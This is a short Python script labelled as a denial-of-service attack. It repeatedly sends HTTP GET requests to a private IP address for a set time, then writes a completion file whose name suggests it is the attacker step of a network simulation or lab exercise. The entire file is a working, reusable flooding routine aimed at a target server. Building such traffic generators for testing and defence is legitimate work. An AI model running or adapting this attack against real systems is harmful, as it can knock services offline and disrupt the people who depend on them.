import requests
import time
import os

def dos_attack(target_url, duration=60, requests_per_second=10):
    print(f"Starting DoS attack on {target_url}")
    end_time = time.time() + duration
    
    while time.time() < end_time:
        for _ in range(requests_per_second):
            try:
                requests.get(target_url)
            except requests.exceptions.RequestException:
                pass
        time.sleep(1)
    
    print("DoS attack completed")

if __name__ == "__main__":
    target_url = "http://172.16.238.2"
    dos_attack(target_url)

    simulation_id = os.environ.get('SIMULATION_ID', 'unknown')
    with open(f'/signals/attacker_done_{simulation_id}', 'w') as f:
        f.write('done')